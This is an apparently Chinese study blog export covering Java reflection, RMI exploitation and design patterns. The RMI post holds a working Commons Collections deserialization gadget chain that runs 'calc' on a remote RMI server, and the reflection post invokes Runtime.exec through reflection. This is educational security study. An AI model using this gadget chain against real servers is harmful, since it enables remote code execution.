<p>实质就是得到一个Class对象后，反向获取Class对象的对象。</p>
<h2 id="Class类、Class对象与class"><a href="#Class类、Class对象与class" class="headerlink" title="Class类、Class对象与class"></a>Class类、Class对象与class</h2><p><code>Class类</code>是java中的一个类，位于<strong>java.lang</strong>包中。它提供了用于获取类信息和操作类或对象的属性和方法的方法。<img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240514205516919.png" alt="image-20240514205516919"></p>
<p><code>Class对象</code>是JVM在运行时保留的每个类的描述信息。Class对象包含了该类的所有信息，包括类的名称、属性、方法、构造函数等。Class对象可以通过Class类的各种方法获取。</p>
<p><code>class</code>是java的关键字，用于声明类。</p>
<hr>
<p><strong>对Class类解读:</strong></p>
<p>我们通常认为类是对象的抽象和集合，Class就相当于是对类的抽象和集合。<br>也可以认为对象是类的实例，类是Class的实例。</p>
<h2 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h2><p>通常有以下几种方法获取一个类的Class对象</p>
<h3 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName()"></a>Class.forName()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;Test&quot;</span>);     如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取</span><br></pre></td></tr></table></figure>

<h3 id="Test-class"><a href="#Test-class" class="headerlink" title="Test.class"></a>Test.class</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; bClass = Test.class;    如果已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就可以直接拿它的class属性。</span><br></pre></td></tr></table></figure>

<h3 id="obj-getClass"><a href="#obj-getClass" class="headerlink" title="obj.getClass()"></a>obj.getClass()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test cClass= <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">Test</span>&gt; aClass1 = cClass.getClass();  如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过 obj.getClass() 来获取它的类</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240514215718317.png" alt="image-20240514215718317"></p>
<p>但在这三种获取CLass类方式中，我们一般使用第三种通过Class.forName方法去动态加载类。且使用forName就不需要import导入其他类，可以加载我们任意的类。</p>
<h2 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h2><p>获取到Class之后，实例化对象，<code>newInstance()</code>方法调用无参的构造器创建对象。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516090748055.png" alt="image-20240516090748055"></p>
<p>(<strong>Class</strong>类中的<code>newInstance()</code>方法)</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516102707921.png" alt="image-20240516102707921"></p>
<p><code>java.lang.relect.Constructor</code>类里也有一个<code>newInstance()</code>方法可以创建对象，该方法和Class类中的<code>newInstance()</code>方法很像，但是相比之下，Constructor类的<code>newInstance()</code>方法更加强大，我们可以通过这个<code>newInstance()</code>方法调用有参数的和私有的构造方法。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516102944537.png" alt="image-20240516102944537"></p>
<p>这时有个问题，比如一个类有很多的构造方法，我们怎么能找到我们想要的构造方法呢？我们可以使用<code>getConstructor()</code>,它根据提供的参数类型来定位特定的构造函数。可以从<code>getConstructor()</code>的函数声明中看到，参数类型是Class可变长参数。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516094652144.png" alt="image-20240516094652144"></p>
<p>因为Test类中有两个属性，<strong>Sting name</strong>和<strong>int age</strong>，<code>getConstructor()</code>填入<strong>String.class</strong>和<strong>int.class</strong>,发现报错了，报错信息提示没有这个方法</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516091359629.png" alt="image-20240516091359629"></p>
<p>可以看到Test类中<strong>age</strong>属性是私有的，这时使用<code>getDeclaredConstructor()</code>方法。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516090723742.png" alt="image-20240516090723742"></p>
<p>设置访问权限为true。就可以通过有参构造函数实例化对象。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516091419131.png" alt="image-20240516091419131"></p>
<h2 id="获取类的属性"><a href="#获取类的属性" class="headerlink" title="获取类的属性"></a>获取类的属性</h2><p>通过<code>getFields()</code>可以获取属性，但是发现这里只获取了name，age并没有被获取，原因其实和上面类似，必须用<code>getDeclaredFields()</code>并设置访问权限。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516095310090.png" alt="image-20240516095310090"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516095330837.png" alt="image-20240516095330837"> </p>
<p><code>set()</code>方法通常和<code>getField()</code>搭配使用,<code>set()</code>方法是<code>Field</code>类的一部分，用于通过反射机制设置对象的字段值，具体一点就是<code>Field</code>对象表示类中的一个成员变量，<code>set()</code>方法允许修改这个字段的值，即使该字段是私有的。在使用之前，通常需要调用<code>setAccessible(true)</code>来绕过Java的访问控制检查。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516101853830.png" alt="image-20240516101853830"></p>
<p><strong>age</strong>属性是私有的</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516102050549.png" alt="image-20240516102050549"></p>
<p>（通过<code>getDeclaredField()</code>设置访问权限）</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516102124715.png" alt="image-20240516102124715"></p>
<h2 id="调用类的方法"><a href="#调用类的方法" class="headerlink" title="调用类的方法"></a>调用类的方法</h2><p>Test类有public Hello方法和Private prHello方法。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516113808489.png" alt="image-20240516113808489"></p>
<p>通过<code>getMethods()</code>可以获取公共方法。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516112756232.png" alt="image-20240516112756232"></p>
<p>通过<code>getDeclaredMethods()</code>可以获取公共方法和私有方法</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516112826908.png" alt="image-20240516112826908"></p>
<p><code>getMethod()</code>通常和<code>invoke()</code>搭配，<code>invoke()</code>可以动态地在运行时调用对象的方法。其实也不难理解，我们通过<code>getMethod()</code>反射获得一个方法后，肯定需要指定是哪个类，并且指明执行的参数。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516131226025.png" alt="image-20240516131226025"></p>
<p>用<code>getMethod()</code>调用一下Test类中的<code>Hello()</code>方法，可以发现它调用的是无参的方法，和实例化对象的情况类似，报错了，需要指明它的类型，否则调用无参的方法。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516130413038.png" alt="image-20240516130413038"></p>
<p>(Class类中的<code>getMethod()</code>方法)</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516113750554.png" alt="image-20240516113750554"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516130817172.png" alt="image-20240516130817172"></p>
<h2 id="小练习，反射弹计算器"><a href="#小练习，反射弹计算器" class="headerlink" title="小练习，反射弹计算器"></a>小练习，反射弹计算器</h2><p>正常情况下咱们弹计算器<img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516133359336.png" alt="image-20240516133359336"></p>
<p>反射写法</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516141618708.png" alt="image-20240516141618708"></p>
<p>因为 <code>getRuntime()</code>是静态方法，属于类，所以<code>getRuntime.invoke()</code>;不需要指定对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//调用 getRuntime 方法，获得 Runtime 类的实例</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> getRuntime.invoke(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516143222774.png" alt="image-20240516143222774"></p>
<p>完整代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取Runtime 类的 Class 对象</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="comment">//获取 Runtime 类中名为 getRuntime 的方法的引用</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="comment">//调用 getRuntime 方法，获得 Runtime 类的实例</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> getRuntime.invoke(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//getMethod() 方法获取 exec 方法的引用</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">//用 invoke() 方法调用 exec</span></span><br><span class="line">        exec.invoke(runtimeInstance, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/MrYushiwen/article/details/107380536">JAVA反射</a></p>
<p><a href="https://www.javasec.org/javase/Reflection/Reflection.html">java反射机制</a></p>
<p><a href="https://xz.aliyun.com/t/7029?time__1311=n4+xnD0GDti=zuDBqooGkY=G=L1K7K6dx&alichlgref=https://xz.aliyun.com/t/7029#toc-0">JAVA反序列化 - 反射机制</a></p>
<p><a href="https://xz.aliyun.com/t/9117?time__1311=n4+xuDgD9DyDnDfhx0O4BqDwp0YicWe4FPmD&alichlgref=https://www.google.com/">JAVA安全基础（二）– 反射机制</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI漏洞利用</title>
    <url>/2024/05/21/JAVA%E5%AE%89%E5%85%A8/RMI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>强烈建议大家在学习之前先去b站看组长的视频了解rmi的通信原理。</p>
<p><a href="https://www.bilibili.com/video/BV1L3411a7ax/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化RMI专题-没有人比我更懂RMI</a></p>
<hr>
<p>RMI 作为后续漏洞中最为基本的利用手段之一，学习的必要性非常之大。对于初学者来说也会偏难，慢慢磨吧。雷军在一次演讲中说到:很多知识点没有绝对的先后顺序，看不懂的先跳过去。</p>
<p>个人感悟：确实很多东西你先过几遍，实在不懂就跳过去，慢慢就懂了，唯一需要的是坚持。</p>
<h2 id="攻击点总结"><a href="#攻击点总结" class="headerlink" title="攻击点总结"></a>攻击点总结</h2><p>在看完组长的视频之后对攻击点总结</p>
<p>一个远程对象的 <code>LiveRef</code> 在整个生命周期内是唯一的，保证了对象引用的一致性。</p>
<h2 id="服务端代码"><a href="#服务端代码" class="headerlink" title="服务端代码"></a>服务端代码</h2><p>添加Commons Collections</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        remoteObj.SayHello(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        remoteObj.SayGoodbye(getpayload());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;lala&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(java.lang.annotation.Retention.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1L3411a7ax/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化RMI专题-没有人比我更懂RMI</a></p>
<p><a href="https://su18.org/post/rmi-attack/">Java RMI 攻击由浅入深</a></p>
<p><a href="https://xz.aliyun.com/t/7930?time__1311=n4+xnD0G0=eQqiIPAKDsA3ExjxtvdiYDgiGYD&alichlgref=https://xz.aliyun.com/u/20851">针对RMI服务的九重攻击 - 上</a></p>
<p><a href="https://xz.aliyun.com/t/7932?time__1311=n4+xnD0G0=eQqiIpq05+b8DkGG8SdKt8DgiYD&alichlgref=https://xz.aliyun.com/u/20851">针对RMI服务的九重攻击 - 下</a></p>
<p><a href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">Java反序列化之RMI专题02-RMI的几种攻击方式</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型-单例模式</title>
    <url>/2024/05/10/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="饿汉式"><a href="#饿汉式" class="headerlink" title="饿汉式"></a>饿汉式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();  <span class="comment">//用于引用全局唯一的单例对象，在一开始就创建好</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;  <span class="comment">//不允许随便new</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;   <span class="comment">//获取全局唯一的单例对象</span></span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> Singleton.getInstance();</span><br><span class="line">        System.out.println(instance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="懒汉式"><a href="#懒汉式" class="headerlink" title="懒汉式"></a>懒汉式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;  <span class="comment">//在一开始不创建对象</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;  <span class="comment">//如果实例为空就创建</span></span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这种方法有种缺陷，由于懒汉式在方法中进行初始化，在多线程的环境下，可能会出现问题。</p>
<h3 id="懒汉式-改进"><a href="#懒汉式-改进" class="headerlink" title="懒汉式-改进"></a>懒汉式-改进</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这种效率比较低，只能又一个线程能进入同步块，其他的必须要等待</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();  <span class="comment">//双重检查</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双重检查可以确保在多线程环境下也能保持单例的唯一性，同时尽可能地减少了同步的开销。</p>
<h3 id="JAVA特有的写法"><a href="#JAVA特有的写法" class="headerlink" title="JAVA特有的写法"></a>JAVA特有的写法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SingletonHolder</span> &#123;  <span class="comment">//由静态内部类持有单例对象，根据类加载的特性，仅使用Singleton类时，不会对静态内部类进行初始化</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Singleton</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123; <span class="comment">//只有真正使用内部类时，才会进行类初始化</span></span><br><span class="line">        <span class="keyword">return</span> SingletonHolder.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Java中，静态内部类在被使用之前是不会被初始化的，这是由类加载器的工作原理决定的。</p>
<p>当程序第一次访问静态内部类 <code>SingletonHolder</code> 时，JVM 会加载 <code>SingletonHolder</code> 类。这个加载过程是延迟的，只有在真正需要使用 <code>SingletonHolder</code> 类时才会触发。所以，即使 <code>Singleton</code> 类被加载了，但是不会导致 <code>SingletonHolder</code> 类被加载，也就不会创建单例对象。</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型-工厂模式</title>
    <url>/2024/05/03/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​	为了写出更“优雅”的代码，遂准备来学习JAVA的设计模式。</p>
<p>​	以前从来没有写文章的习惯，发现学过的东西容易忘记，也可能是学的过于表面，不够深入，了解了费曼学习法，决定开始码文章，当作学习记录吧，也方便回顾。</p>
<h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><p>​	JAVA的设计模式分为三类，创建型模式（关注对象的创建机制）、结构性模式（关注类和对象之间的组合）、行为型模式（关注对象之间的通信以及责任的分配）</p>
<h2 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Fruit</span> &#123; <span class="comment">//水果抽象类</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">Fruit</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name +<span class="string">&quot;@&quot;</span>+hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Apple</span> <span class="keyword">extends</span> <span class="title class_">Fruit</span> &#123; <span class="comment">//继承水果</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Apple</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(<span class="string">&quot;苹果&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Orange</span> <span class="keyword">extends</span> <span class="title class_">Fruit</span> &#123;	<span class="comment">//继承水果</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Orange</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;橘子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimplefruitFactory</span> &#123; <span class="comment">//水果工厂</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Fruit <span class="title function_">getFruit</span><span class="params">(String type)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;苹果&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Apple</span>();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;橘子&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Orange</span>();</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 处理未知类型</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> SimplefruitFactory.getFruit(<span class="string">&quot;橘子&quot;</span>); <span class="comment">//通过工厂创建</span></span><br><span class="line">        System.out.println(fruit);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	这样做的好处是，比如Apple的构造方法需要新的参数，我们只需要修改工厂里面的参数，因为其他地方是通过工厂获得的水果的实例。</p>
